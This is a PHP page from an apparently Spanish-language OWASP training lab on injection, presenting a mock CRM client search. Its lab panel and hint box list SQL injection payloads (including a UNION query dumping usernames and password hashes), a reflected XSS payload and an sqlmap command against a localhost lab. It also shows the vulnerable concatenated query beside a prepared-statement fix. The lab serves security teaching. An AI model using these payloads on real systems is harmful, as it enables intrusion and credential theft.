<?php
/**
 * OWASP Top 10 Labs 2025 - A05: Injection
 * Modulo: Buscador de Clientes
 * 
 * Este archivo muestra el CRM de Nexo con un buscador de clientes.
 * La vulnerabilidad esta en buscar.php que concatena el input directamente.
 */

session_start();

// Simular usuario logueado
$_SESSION['user_id'] = $_SESSION['user_id'] ?? 2;
$_SESSION['username'] = $_SESSION['username'] ?? 'alice';

require_once __DIR__ . '/../config/db.php';

$pageTitle = 'Buscador de Clientes - Nexo';

// Info del lab para el panel lateral
$labInfo = [
    'id' => 'A05:2025',
    'name' => 'Injection',
    'difficulty' => 'Intermedia',
    'description' => '
        <p>El buscador de clientes arma la query SQL por <strong>concatenacion directa</strong>:</p>
        <pre class="vulnerable small p-2">$q = "SELECT * FROM clients 
WHERE name LIKE \'%" . $_GET[\'q\'] . "%\'";</pre>
        <p>Esto permite:</p>
        <ul>
            <li><strong>SQL Injection:</strong> extraer datos de otras tablas</li>
            <li><strong>XSS reflejado:</strong> el output no esta sanitizado</li>
        </ul>
    ',
    'exploit' => '# SQL Injection basico - ver todos los clientes
curl "http://localhost:8082/a05_clientes/buscar.php?q=\' OR \'1\'=\'1"

# UNION - extraer usuarios y passwords (MD5)
curl "http://localhost:8082/a05_clientes/buscar.php?q=\' UNION SELECT id,username,password_md5,email,role,created_at,7,8 FROM users-- "

# XSS reflejado
curl "http://localhost:8082/a05_clientes/buscar.php?q=<script>alert(\'XSS\')</script>"

# SQLMap automatizado
sqlmap -u "http://localhost:8082/a05_clientes/buscar.php?q=test" --dbs',
    'prevention' => '// VULNERABLE (buscar.php):
$q = "SELECT * FROM clients WHERE name LIKE \'%" . $_GET[\'q\'] . "%\'";
$result = $conn->query($q);
echo $row[\'name\']; // Sin escapar

// SEGURO (buscar_secure.php):
$stmt = $pdo->prepare("SELECT * FROM clients WHERE name LIKE ?");
$stmt->execute([\'%\' . $q . \'%\']);
echo htmlspecialchars($row[\'name\']); // Escapado',
    'caseStudy' => [
        'title' => 'Equifax (2017)',
        'description' => 'La filtracion de datos de 147 millones de personas empezo por una vulnerabilidad de injection en Apache Struts. Costo estimado: $1.4 billones de dolares.'
    ],
    'cwes' => ['CWE-89', 'CWE-79'],
    'tools' => ['SQLMap', 'Burp Suite', 'curl'],
];

// Obtener todos los clientes para mostrar inicialmente
try {
    $pdo = getDbConnection();
    $stmt = $pdo->query("SELECT * FROM clients ORDER BY name");
    $clients = $stmt->fetchAll();
} catch (PDOException $e) {
    $clients = [];
    $error = "Error al cargar clientes: " . $e->getMessage();
}

include __DIR__ . '/../shared/header.php';
?>

<main class="container py-4">
    <div class="d-flex justify-content-between align-items-center mb-4">
        <div>
            <h1 class="h3 mb-1">Buscador de Clientes</h1>
            <p class="text-muted mb-0">
                CRM de Nexo - Cartera de <?= count($clients) ?> clientes
            </p>
        </div>
        <a href="/" class="btn btn-outline-secondary">Volver al inicio</a>
    </div>

    <!-- Buscador -->
    <div class="card mb-4">
        <div class="card-body">
            <form action="buscar.php" method="GET" class="row g-3 align-items-end">
                <div class="col-md-8">
                    <label for="q" class="form-label">Buscar cliente por nombre</label>
                    <input type="text" 
                           class="form-control form-control-lg" 
                           id="q" 
                           name="q" 
                           placeholder="Ej: Constructora, Importadora..."
                           autocomplete="off">
                </div>
                <div class="col-md-4">
                    <button type="submit" class="btn btn-primary btn-lg w-100">
                        Buscar
                    </button>
                </div>
            </form>
        </div>
    </div>

    <!-- Hints para el lab -->
    <div class="alert alert-warning">
        <strong>Pista del lab:</strong> 
        Proba buscar: <code>' OR '1'='1</code> o 
        <code>' UNION SELECT id,username,password_md5,email,role,created_at,7,8 FROM users-- </code>
    </div>

    <?php if (isset($error)): ?>
        <div class="alert alert-danger"><?= htmlspecialchars($error) ?></div>
    <?php endif; ?>

    <!-- Listado de clientes -->
    <div class="card">
        <div class="card-header bg-white d-flex justify-content-between align-items-center">
            <strong>Todos los clientes</strong>
            <span class="badge bg-primary"><?= count($clients) ?> registros</span>
        </div>
        <div class="table-responsive">
            <table class="table table-hover mb-0">
                <thead class="table-light">
                    <tr>
                        <th>ID</th>
                        <th>Nombre/Razon Social</th>
                        <th>RUT</th>
                        <th>Email</th>
                        <th>Telefono</th>
                        <th>Direccion</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($clients as $client): ?>
                    <tr>
                        <td><code><?= $client['id'] ?></code></td>
                        <td><?= htmlspecialchars($client['name']) ?></td>
                        <td><code><?= htmlspecialchars($client['rut']) ?></code></td>
                        <td><small><?= htmlspecialchars($client['email']) ?></small></td>
                        <td><small><?= htmlspecialchars($client['phone']) ?></small></td>
                        <td><small class="text-muted"><?= htmlspecialchars($client['address']) ?></small></td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
    </div>

    <!-- Comparacion con version segura -->
    <div class="row mt-4">
        <div class="col-md-6">
            <div class="card border-danger">
                <div class="card-header bg-danger text-white">
                    Version Vulnerable
                </div>
                <div class="card-body">
                    <a href="buscar.php?q=test" class="btn btn-outline-danger w-100 mb-2">
                        buscar.php
                    </a>
                    <p class="small text-muted mb-0">
                        Concatena el input en la query. Sin htmlspecialchars en el output.
                    </p>
                </div>
            </div>
        </div>
        <div class="col-md-6">
            <div class="card border-success">
                <div class="card-header bg-success text-white">
                    Version Segura
                </div>
                <div class="card-body">
                    <a href="buscar_secure.php?q=test" class="btn btn-outline-success w-100 mb-2">
                        buscar_secure.php
                    </a>
                    <p class="small text-muted mb-0">
                        Prepared statements + htmlspecialchars en el output.
                    </p>
                </div>
            </div>
        </div>
    </div>
</main>

<?php 
include __DIR__ . '/../shared/lab_panel.php';
include __DIR__ . '/../shared/footer.php'; 
?>
